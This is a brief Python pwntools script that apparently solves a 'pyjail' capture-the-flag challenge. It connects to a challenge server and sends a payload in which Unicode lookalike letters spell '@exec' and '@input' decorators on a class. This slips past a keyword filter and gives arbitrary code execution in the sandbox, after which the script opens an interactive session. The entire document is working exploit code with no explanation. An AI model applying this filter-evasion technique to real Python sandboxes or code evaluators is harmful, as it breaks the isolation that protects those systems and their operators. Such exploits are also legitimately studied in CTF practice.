from pwn import remote
# nc challs1.pyjail.club 6197

r = remote('challs1.pyjail.club', 6197)

inp = '''@𝘦xec
@𝘪nput
class x:0
'''.replace('\n', '\r')

r.sendline(inp)
r.interactive()